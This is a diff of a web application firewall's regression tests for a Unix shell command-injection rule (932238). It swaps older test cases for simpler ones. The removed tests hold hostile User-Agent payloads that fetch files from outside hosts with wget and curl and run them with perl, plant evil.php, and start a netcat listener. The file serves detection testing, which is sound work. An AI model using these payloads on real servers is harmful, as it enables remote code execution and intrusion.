@@ -1,138 +1,84 @@
 ---
 meta:
-  author: "Franziska Bühler, Max Leske"
-  description: |
-    Unix shell RCE
-      - with / without prefix
-      - command words of any length
-      - `User-Agent` only
+  author: "Franziska Bühler"
   enabled: true
-  name: 932238.yaml
+  name: "932238.yaml"
 tests:
   - test_title: 932238-1
-    desc: "Unix RCE in request headers"
     stages:
       - stage:
           input:
-            dest_addr: 127.0.0.1
-            headers:
-              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
-              Host: localhost
-              User-Agent: ";chmod +x evil.php"
-            method: GET
+            dest_addr: "127.0.0.1"
+            method: "GET"
             port: 80
-            uri: /
-            version: HTTP/1.0
+            headers:
+              User-Agent: env
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            uri: "/"
+            protocol: "http"
           output:
-            log_contains: id "932238"
+            log_contains: "id \"932238\""
   - test_title: 932238-2
-    desc: "Unix RCE in request headers - uppercase"
     stages:
       - stage:
           input:
-            dest_addr: 127.0.0.1
-            headers:
-              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
-              Host: localhost
-              User-Agent: ";CHMOD +X EVIL.PHP"
-            method: GET
+            dest_addr: "127.0.0.1"
+            method: "GET"
             port: 80
-            uri: /
-            version: HTTP/1.0
+            headers:
+              User-Agent: id
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            uri: "/"
+            protocol: "http"
           output:
-            log_contains: id "932238"
+            log_contains: "id \"932238\""
   - test_title: 932238-3
-    desc: System Command Injection (932238) from old modsec regressions
     stages:
       - stage:
           input:
-            dest_addr: 127.0.0.1
-            headers:
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-              Accept-Encoding: gzip,deflate
-              Accept-Language: en-us,en;q=0.5
-              Host: localhost
-              Keep-Alive: '300'
-              Proxy-Connection: keep-alive
-              User-Agent: system('echo cd /tmp;wget http://turbatu.altervista.org/apache_32.png -O p2.txt;curl -O http://turbatu.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://turbatu.altervista.org/apache_32.png >p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf
-            method: GET
+            dest_addr: "127.0.0.1"
+            method: "GET"
             port: 80
-            uri: /get
-            version: HTTP/1.1
+            headers:
+              User-Agent: set
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            protocol: "http"
           output:
-            log_contains: id "932238"
+            log_contains: "id \"932238\""
   - test_title: 932238-4
-    desc: System Command Injection (932238) from old modsec regressions
     stages:
       - stage:
           input:
-            dest_addr: 127.0.0.1
-            headers:
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-              Accept-Encoding: gzip,deflate
-              Accept-Language: en-us,en;q=0.5
-              Host: localhost
-              Keep-Alive: '300'
-              Proxy-Connection: keep-alive
-              User-Agent: http://ricky.ilmerlodellarocca.com/upload.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg; appa.jpg;perl appa.jpg;rm -rf appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;mv ca.php ca.php;chmod 755 ca.php
-            method: GET
+            dest_addr: "127.0.0.1"
+            method: "GET"
             port: 80
-            uri: /get
-            version: HTTP/1.1
+            headers:
+              User-Agent: settings
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            uri: '/'
+            protocol: "http"
           output:
-            log_contains: id "932238"
+            no_log_contains: "id \"932238\""
   - test_title: 932238-5
-    desc: True Positive Fix Test 1 ISO-8859-2, ISO-8859-3, ISO-8859-4, ISO-8859-5, ISO-8859-6, ISO-8859-7, ISO-8859-8, ISO-8859-10, ISO-8859-14, ISO-8859-15 are affected because the chars are encoded as decimal html %26%238222%3B and %26%238221%3B entities
     stages:
       - stage:
           input:
-            dest_addr: 127.0.0.1
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
             headers:
-              Host: localhost
-              User-Agent: Something true positive &#8222;The Title&#8221;. After space or new line more characters
+              User-Agent: environment
+              Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-              Accept-Encoding: gzip, deflate, br
-              Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
-              Content-Type: application/x-www-form-urlencoded
-            method: POST
-            port: 80
-            uri: /post
-            version: HTTP/1.1
+            uri: '/'
+            protocol: "http"
           output:
-            no_log_contains: id "932238"
+            no_log_contains: "id \"932238\""
   - test_title: 932238-6
-    desc: "False negative report - user agent"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
-              Host: localhost
-              User-Agent: ;cp /var/log/apache2/error.log evil.php
-            method: POST
-            port: 80
-            uri: /post
-            version: HTTP/1.0
-          output:
-            log_contains: id "932238"
-  - test_title: 932238-7
-    desc: "IXMZUXBG"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              User-Agent: a=nc&&$a -nlvp 555
-              Host: localhost
-              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
-            method: GET
-            port: 80
-            uri: /get
-            version: HTTP/1.0
-          output:
-            log_contains: id "932238"
-  - test_title: 932238-8
     desc: "FP match of 'curl' in User-Agent header"
     stages:
       - stage:
@@ -148,7 +94,7 @@ tests:
             version: HTTP/1.0
           output:
             no_log_contains: id "932238"
-  - test_title: 932238-9
+  - test_title: 932238-7
     desc: "FP match of 'wget' in User-Agent header"
     stages:
       - stage:
